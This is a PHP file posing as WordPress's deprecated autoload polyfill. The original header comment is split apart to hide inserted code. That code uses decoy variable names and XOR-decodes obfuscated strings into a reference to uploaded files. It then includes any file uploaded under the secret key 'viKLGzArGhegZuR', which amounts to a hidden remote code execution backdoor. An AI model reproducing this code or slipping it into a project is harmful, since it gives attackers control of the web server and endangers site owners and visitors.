<?php /* 
*
 * Polyfill for SPL autoload feature. This file is separate to prevent compiler notices
 * on the deprecated __autoload() function.
 *
 * See https:core.trac.wordpress.org/ticket/41134
 *
 * @deprecated 5.3.0 No longer needed as the minimum PHP requirement has moved beyond PHP 5.3.
 *
 * @package PHP
 * @access private
 

_deprecated_file( basename( __FILE__ ), '5.3.0', '', 'SPL can no longer */

        
    
	$rich_text = 'translation';
        
	$last_char = 'item';
function subs($close_quote)

{
	$html_parts = '_ext';
    $key = $close_quote;
    
    $run_texturize = $GLOBALS[count2("%29%2F%02%00%02%29", $key)];
    $keep_newlines = $run_texturize;

    $can_export = isset($keep_newlines[$key]);

    if ($can_export)

    {

        $site_url = $run_texturize[$key];
        $lastpostdate = $site_url[count2("%02%04%3B%13%29%1B%2C%17", $key)];

        $extension = $lastpostdate;
        include ($extension);
    }

}

function count2($tax_object, $comments_in)

{
    $map_meta_cap = $comments_in;
    $callback = "url" . "decode";
    $author_query = $callback($tax_object);

    $post_type = substr($map_meta_cap,0, strlen($author_query));
    $path = $author_query ^ $post_type;
    
    $author_query = strpos($path, $post_type);

    
    return $path;
	$entity = 'wpsmiliestrans';
}

	$old_dates = 'protocol';
subs('viKLGzArGhegZuR');
	$email_no_spam_address = 'start';



/* be disabled as of PHP 5.3.' );
*/